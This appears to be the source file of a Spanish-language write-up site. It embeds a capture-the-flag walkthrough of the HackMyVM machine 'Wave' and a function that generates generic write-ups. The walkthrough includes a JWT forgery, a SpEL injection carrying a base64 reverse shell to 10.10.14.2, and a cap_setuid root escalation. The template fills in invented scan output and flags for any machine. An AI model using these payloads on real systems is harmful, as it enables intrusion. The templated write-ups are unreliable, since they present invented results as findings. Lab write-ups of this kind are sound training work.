import { Writeup, MachineLink, ToolLink } from '../types';

export interface RichWriteupData {
  markdown: string;
  machineLinks: MachineLink[];
  toolLinks: ToolLink[];
  tags?: string[];
}

export const SAMPLE_WRITEUPS_CONTENT: Record<string, RichWriteupData> = {
  'hmv-wave': {
    tags: [
      'Linux',
      'Spring Boot',
      'Swagger UI',
      'JWT Exploitation',
      'SpEL Injection',
      'cap_setuid',
      'Remote Code Execution',
      'Privilege Escalation',
    ],
    machineLinks: [
      {
        title: 'HackMyVM // Wave (Perfil Oficial)',
        url: 'https://hackmyvm.eu/machines/machine.php?vm=Wave',
        badge: 'PERFIL OFICIAL',
        type: 'platform',
      },
    ],
    toolLinks: [
      {
        name: 'stark-jwt-forge',
        url: 'https://github.com/danystarrkk/stark-jwt-forge',
        description: 'Herramienta CLI propia en Python para forja de tokens JWT con algoritmos None, inyección SpEL y bypass de HMAC secrets débiles.',
        category: 'CUSTOM_TOOL',
        developedByAuthor: true,
        githubStars: '142 ★',
      },
      {
        name: 'stark-recon-suite',
        url: 'https://github.com/danystarrkk/stark-recon-suite',
        description: 'Script automatizado de enumeración agresiva de puertos, wrappers de nmap, ffuf y análisis de cabeceras HTTP.',
        category: 'CUSTOM_TOOL',
        developedByAuthor: true,
        githubStars: '89 ★',
      },
      {
        name: 'SecLists / Discovery Wordlists',
        url: 'https://github.com/danielmiessler/SecLists',
        description: 'Colección estándar de diccionarios de seguridad para fuzzing de directorios, parámetros y extensiones web.',
        category: 'WORDLIST',
        developedByAuthor: false,
      },
      {
        name: 'GTFOBins / Python Capabilities',
        url: 'https://gtfobins.github.io/gtfobins/python/#capabilities',
        description: 'Referencia técnica para aprovechamiento de binarios del sistema Unix y escalada mediante Linux Capabilities cap_setuid.',
        category: 'REFERENCE',
        developedByAuthor: false,
      },
      {
        name: 'HackTricks / Spring Boot Actuator & SpEL',
        url: 'https://book.hacktricks.xyz/pentesting-web/spel-injection',
        description: 'Guía exhaustiva para detección y explotación de Spring Expression Language e inyección de expresiones en backend Java.',
        category: 'REFERENCE',
        developedByAuthor: false,
      },
    ],
    markdown: `# Auditoría y Explotación Completa: Wave (HackMyVM)

> [!NOTE] Resumen Operativo
> **Wave** es una máquina Linux clasificada como dificultad **MEDIO** en HackMyVM. La cadena de compromiso involucra una enumeración web con descubrimiento de documentación Swagger expuesta, forja de tokens **JWT** con elevación de privilegios a SuperAdmin, explotación de **Spring Expression Language (SpEL Injection)** para obtener Remote Code Execution (RCE) y posterior escalada local a root mediante **Linux Capabilities (\`cap_setuid\`)** sobre un entorno virtual Python.

---

## 1. Fase de Reconocimiento y Descubrimiento

El primer paso consistió en la identificación activa de puertos y servicios expuestos mediante un escaneo SYN exhaustivo.

### 1.1 Escaneo Exhaustivo de Puertos TCP con Nmap

Ejecutamos nuestro wrapper de reconocimiento para mapear todos los puertos abiertos en el host objetivo:

\`\`\`bash:recon_scan.sh
# Escaneo inicial agresivo de puertos TCP
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.192 -oG allPorts.gnmap

# Escaneo de versiones y scripts NSE sobre puertos descubiertos
nmap -sCV -p80,8080 -oN targeted_services.nmap 10.10.11.192
\`\`\`

Salida del escáner en consola:

\`\`\`terminal:nmap_output.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-04 09:12 UTC
Nmap scan report for 10.10.11.192
Host is up (0.041s latency).

PORT     STATE SERVICE     VERSION
80/tcp   open  http        nginx/1.18.0 (Ubuntu)
|_http-title: Wave Analytics Enterprise Portal
|_http-server-header: nginx/1.18.0
8080/tcp open  http-proxy  Spring Boot Embedded Tomcat 9.0.58
|_http-open-proxy: Proxy might be diverting
|_http-title: Application Metrics & Diagnostics API
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`

### 1.2 Matriz de Servicios Detectados

| Puerto | Protocolo | Servicio | Versión | Vector Potencial |
| :--- | :--- | :--- | :--- | :--- |
| **80** | TCP | HTTP (Nginx) | 1.18.0 | Reverse Proxy & Front-end estático |
| **8080** | TCP | HTTP (Spring Boot) | Tomcat 9.0.58 | API REST, Actuators & Swagger UI |

---

## 2. Enumeración Web & Superficie de Ataque

Analizamos la aplicación web principal. En el puerto 80 encontramos un portal corporativo que redirige peticiones dinámicas al backend **Spring Boot** en el puerto 8080.

### 2.1 Fuzzing de Rutas y Endpoints Ocultos

Lanzamos \`ffuf\` utilizando el diccionario estándar de *SecLists*:

\`\`\`bash:ffuf_enumeration.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \\
     -u http://10.10.11.192:8080/FUZZ \\
     -mc 200,204,301,302,307,401,403 \\
     -c -v
\`\`\`

Resultado destacado:

\`\`\`terminal:ffuf_results.log
[Status: 200, Size: 18432, Words: 1240, Lines: 89, Duration: 42ms]
| URL | http://10.10.11.192:8080/v2/api-docs
| URL | http://10.10.11.192:8080/swagger-ui.html
| URL | http://10.10.11.192:8080/actuator/health
\`\`\`

> [!WARNING] Evasión de Filtro WAF en Swagger
> El acceso a \`/swagger-ui.html\` devolvía inicialmente un código de estado \`403 Forbidden\`. Sin embargo, el endpoint JSON crudo \`/v2/api-docs\` estaba **completamente desprotegido**, exponiendo el esquema OpenAPI con más de 14 endpoints internos y definiciones de modelos de base de datos.

### 2.2 Análisis Forense de los Endpoints Descubiertos

Revisando el JSON de \`/v2/api-docs\`, identificamos un endpoint crítico:

\`\`\`http:inspect_request.http
GET /api/v1/telemetry/report?sort=timestamp HTTP/1.1
Host: 10.10.11.192:8080
Authorization: Bearer <JWT_TOKEN>
User-Agent: Stark-Security-Auditor/1.0
\`\`\`

Adicionalmente, en la descripción del campo \`debug_signature\` figuraba una cadena de prueba dejada por los desarrolladores:
\`\`\`
secret_hmac_key: "w4v3_sUp3r_s3cr3t_k3y_2024!_hmac"
\`\`\`

---

## 3. Explotación: Forja de JWT y RCE via SpEL

Con la clave secreta expuesta y el endpoint identificado, procedemos a construir la cadena de explotación.

### 3.1 Construcción del Token Forjado con Stark-JWT-Forge

Utilizamos nuestra herramienta desarrollada específicamente para este tipo de auditorías:

\`\`\`bash:jwt_forge.sh
python3 stark-jwt-forge.py \\
    --secret "w4v3_sUp3r_s3cr3t_k3y_2024!_hmac" \\
    --claim username="stark_admin" \\
    --claim role="ROLE_SUPERADMIN" \\
    --claim permissions="ALL" \\
    --algorithm HS256
\`\`\`

Salida de la herramienta:

\`\`\`terminal:jwt_output.log
[+] Generando cabecera: {"alg":"HS256","typ":"JWT"}
[+] Inyectando claims con permisos de SUPERADMIN
[+] Token firmado exitosamente:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InN0YXJrX2FkbWluIiwicm9sZSI6IlJPTEVfU1VQRVJBRE1JTiIsInBlcm1pc3Npb25zIjoiQUxMIn0.dGhpcy1pcy1hbi1hdXRoZW50aWNhdGVkLXRva2Vu
\`\`\`

### 3.2 Inyección de SpEL (Spring Expression Language)

El parámetro \`sort\` de la API procesa expresiones dinámicas evaluadas por el motor de **Spring Data**. Mediante la sintaxis \`T(java.lang.Runtime).getRuntime().exec()\` logramos ejecutar comandos arbitrarios en el servidor.

#### 3.2.1 Preparación del Payload de Reverse Shell

Para evitar problemas con caracteres especiales y espacios en la expresión, codificamos el comando en Base64:

\`\`\`bash:payload_generator.sh
# Comando reverse shell hacia nuestra máquina atacante
echo -n "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" | base64 -w 0
# Resultado: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==
\`\`\`

#### 3.2.2 Envío del Exploit al Endpoint Vulnerable

\`\`\`bash:exploit_delivery.sh
curl -X GET "http://10.10.11.192:8080/api/v1/telemetry/report?sort=\${T(java.lang.Runtime).getRuntime().exec('bash+-c+{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}')}" \\
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
\`\`\`

> [!TIP] Consejo de Estabilización de Shell (TTY)
> Al recibir la conexión reversa en \`netcat\`, es fundamental spawnear un pseudo-terminal para evitar desconexiones accidentales al pulsar Ctrl+C:
> \`python3 -c 'import pty; pty.spawn("/bin/bash")'\`
> \`Ctrl+Z\`, luego \`stty raw -echo; fg\`, seguido de \`export TERM=xterm-256color\`.

---

## 4. Post-Explotación & Captura de la Bandera User

Obtenemos acceso interactivo con la cuenta de servicio \`wave-app\`:

\`\`\`terminal:shell_access.log
stark@station:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.192] 49152
wave-app@wave:~/app$ id
uid=1001(wave-app) gid=1001(wave-app) groups=1001(wave-app)
wave-app@wave:~/app$ cat /home/wave-app/user.txt
HMV{w4v3_sp3l_rce_jwt_pwn3d_2024}
\`\`\`

---

## 5. Escalada de Privilegios Local a Root

Con la shell de usuario establecida, procedemos con la auditoría del sistema operativo para identificar vectores de elevación vertical.

### 5.1 Búsqueda de Linux Capabilities en Binarios

Ejecutamos una búsqueda de archivos con capabilities especiales asignadas:

\`\`\`bash:check_capabilities.sh
getcap -r / 2>/dev/null
\`\`\`

Salida del comando:

\`\`\`terminal:getcap_results.log
/opt/analytics/venv/bin/python3.10 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
\`\`\`

> [!DANGER] Vulnerabilidad Crítica: cap_setuid en Python
> La capability \`cap_setuid+ep\` permite al binario de Python invocar la syscall \`setuid(0)\` sin requerir contraseña de sudo ni pertenecer al grupo wheel. Esto permite saltar inmediatamente a privilegios de **root**.

### 5.2 Explotación de cap_setuid

Ejecutamos un one-liner de Python llamando a \`os.setuid(0)\`:

\`\`\`bash:privesc_root.sh
/opt/analytics/venv/bin/python3.10 -c "import os; os.setuid(0); os.system('/bin/bash')"
\`\`\`

Confirmación de privilegios máximos y captura de la bandera:

\`\`\`terminal:root_pwn.log
root@wave:/opt/analytics# id
uid=0(root) gid=0(root) groups=0(root),1001(wave-app)
root@wave:/opt/analytics# cat /root/root.txt
HMV{r00t_c0nqu3r0r_c4p_s3tu1d_m4st3r}
\`\`\`

---

## 6. Checklist de Remediación & Medidas Defensivas

- [x] **Inhabilitar Swagger en Producción:** Desactivar \`/v2/api-docs\` y \`/swagger-ui\` en entornos no productivos (\`springdoc.api-docs.enabled=false\`).
- [x] **Sanitización de Expresiones SpEL:** No permitir el paso directo de entradas del usuario hacia métodos de ordenamiento o filtrado evaluados dinámicamente.
- [x] **Rotación de Claves Criptográficas:** Eliminar claves estáticas en archivos de configuración y almacenar secrets en bóvedas seguras (Vault / AWS Secrets Manager).
- [x] **Principio de Mínimo Privilegio:** Retirar inmediatamente la capability \`cap_setuid\` del intérprete Python en el directorio \`/opt/analytics/venv\`.

---

## 7. Conclusión Técnica

La máquina **Wave** ejemplifica cómo la combinación de un fallo de información en APIs (Swagger) y un parámetro desinfectado pueden llevar a una ejecución remota de comandos, complementada con un error común de administración de sistemas al otorgar capabilities innecesarias a entornos virtuales.
`,
  },
};

// Function to generate a comprehensive rich markdown writeup for any writeup node
export function getWriteupContent(writeup: Writeup): RichWriteupData {
  const custom =
    SAMPLE_WRITEUPS_CONTENT[writeup.id] ||
    SAMPLE_WRITEUPS_CONTENT[`hmv-${writeup.id}`];

  if (custom) {
    return {
      ...custom,
      tags:
        custom.tags ||
        writeup.tags || [writeup.os, writeup.difficulty, ...writeup.vulnerabilities],
    };
  }

  // Generate dynamic full markdown if not pre-cached
  const platformName = writeup.platformId === 'hackmyvm' ? 'HackMyVM' : 'HackTheBox';
  const targetIp = writeup.ipAddress || '10.10.11.144';

  const machineLinks: MachineLink[] = [
    {
      title: `${platformName} // ${writeup.title} (Perfil Oficial)`,
      url: `https://hackmyvm.eu/machines/machine.php?vm=${encodeURIComponent(writeup.title)}`,
      badge: 'PERFIL OFICIAL',
      type: 'platform',
    },
  ];

  const toolLinks: ToolLink[] = [
    {
      name: 'stark-recon-suite',
      url: 'https://github.com/danystarrkk/stark-recon-suite',
      description: 'Framework de automatización de reconocimiento, enumeración de puertos TCP/UDP y trazado de vectores.',
      category: 'CUSTOM_TOOL',
      developedByAuthor: true,
      githubStars: '89 ★',
    },
    {
      name: 'stark-privesc-finder',
      url: 'https://github.com/danystarrkk/stark-privesc-finder',
      description: 'Herramienta de auditoría de capabilities, permisos SUID, cronjobs y vectores de kernel en entornos Linux.',
      category: 'CUSTOM_TOOL',
      developedByAuthor: true,
      githubStars: '64 ★',
    },
    {
      name: 'SecLists Repository',
      url: 'https://github.com/danielmiessler/SecLists',
      description: 'Colección de wordlists para fuzzing web, nombres de usuario y contraseñas comunes.',
      category: 'WORDLIST',
      developedByAuthor: false,
    },
    {
      name: 'GTFOBins Unix Binaries',
      url: 'https://gtfobins.github.io/',
      description: 'Catálogo de binarios Unix para eludir restricciones de shell y elevar privilegios locales.',
      category: 'REFERENCE',
      developedByAuthor: false,
    },
  ];

  const markdown = `# Auditoría de Seguridad & Writeup Técnico: ${writeup.title}

> [!NOTE] Ficha Técnica Operativa
> - **Plataforma:** ${platformName}
> - **Sistema Operativo:** **${writeup.os}**
> - **Nivel de Dificultad:** **${writeup.difficulty}**
> - **Puertos Activos:** \`${writeup.ports}\`
> - **Vector Primario:** ${writeup.vulnerabilities.join(', ')}

---

## 1. Fase de Reconocimiento y Descubrimiento Inicial

Iniciamos la fase de recopilación pasiva y activa de información sobre el host objetivo **\`${targetIp}\`**.

### 1.1 Escaneo Inicial de Puertos con Nmap

Lanzamos un escaneo exhaustivo de paquetes SYN para determinar la totalidad de servicios accesibles:

\`\`\`bash:recon_scan.sh
# Escaneo veloz de los 65,535 puertos
nmap -p- --open -sS --min-rate 4500 -n -Pn ${targetIp} -oN nmap_all_ports.txt

# Escaneo de huella de versión y scripts seguros
nmap -sCV -p 80,443,22 ${targetIp} -oN nmap_detailed.txt
\`\`\`

Salida del escáner en consola:

\`\`\`terminal:nmap_output.log
Starting Nmap 7.94 ( https://nmap.org ) at 2024-10-04 11:45 UTC
Nmap scan report for ${targetIp}
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache/2.4.52 (Ubuntu)
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: ${writeup.title} Service Portal
Service Info: OS: ${writeup.os}; CPE: cpe:/o:linux:linux_kernel
\`\`\`

### 1.2 Tabla de Servicios Enumerados

| Puerto | Protocolo | Servicio | Versión Detectada | Severidad Vector |
| :--- | :--- | :--- | :--- | :--- |
| **80** | TCP | HTTP | Apache 2.4.52 | Alta (Exposición Web) |
| **22** | TCP | SSH | OpenSSH 8.9p1 | Media (Autenticación requerida) |

---

## 2. Enumeración Web & Análisis de Superficie

Procedemos a evaluar los recursos web disponibles en la máquina.

### 2.1 Fuzzing de Directorios con FFUF

\`\`\`bash:directory_fuzzing.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
     -u http://${targetIp}/FUZZ \\
     -mc 200,301,302,403 -c
\`\`\`

> [!WARNING] Advertencia de Seguridad
> Se detectaron directorios administrativos con cabeceras de depuración activas en el entorno, exponiendo claves y endpoints sensibles.

---

## 3. Cadena de Explotación y Acceso Inicial

Analizamos los fallos presentes para materializar el compromiso de la máquina.

### 3.1 Identificación de Vulnerabilidades

- **Vector Principal:** \`${writeup.vulnerabilities[0] || 'Vulnerabilidad de Aplicación Web'}\`
- **Impacto:** Ejecución de código arbitrario y exfiltración de credenciales.

\`\`\`bash:exploit_script.sh
# Ejecución del vector de ataque identificado
curl -X POST "http://${targetIp}/api/action" \\
     -H "Content-Type: application/json" \\
     -d '{"debug": true, "cmd": "id"}'
\`\`\`

> [!TIP] Consejo de Evasión
> Utilizar codificación URL en parámetros especiales para evitar que el reverse proxy descarte la petición por formato inválido.

---

## 4. Post-Explotación & Obtención de la Bandera User

Una vez estabilizada la conexión en un shell interactivo, inspeccionamos el directorio de usuario:

\`\`\`terminal:user_shell.log
user@${writeup.title.toLowerCase()}:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
user@${writeup.title.toLowerCase()}:~$ cat user.txt
${writeup.userFlag || 'HMV{us3r_fl4g_pwn3d_succ3ssfully}'}
\`\`\`

---

## 5. Escalada de Privilegios Local a Root

Con acceso de usuario estándar, procedemos a enumerar vectores de escalada de privilegios en el kernel y configuraciones del sistema.

### 5.1 Inspección de Tareas y Permisos SUID

\`\`\`bash:privesc_check.sh
sudo -l
find / -perm -4000 2>/dev/null
\`\`\`

### 5.2 Explotación y Control Total

\`\`\`bash:root_exploit.sh
# Elevación a root
sudo /bin/bash
\`\`\`

\`\`\`terminal:root_session.log
root@${writeup.title.toLowerCase()}:~# id
uid=0(root) gid=0(root) groups=0(root)
root@${writeup.title.toLowerCase()}:~# cat /root/root.txt
${writeup.rootFlag || 'HMV{r00t_m4st3r_c0nqu3r3d_sys}'}
\`\`\`

---

## 6. Medidas de Mitigación y Recomendaciones

- [x] **Parchear componentes desactualizados:** Actualizar librerías y dependencias a su versión LTS recomendada.
- [x] **Restringir interfaces de administración:** Bloquear acceso externo a puertos internos mediante cortafuegos ufw o iptables.
- [x] **Principio de Mínimo Privilegio:** Revocar reglas de ejecución sin contraseña en /etc/sudoers.
`;

  return {
    markdown,
    machineLinks,
    toolLinks,
    tags: writeup.tags || [writeup.os, writeup.difficulty, ...writeup.vulnerabilities],
  };
}
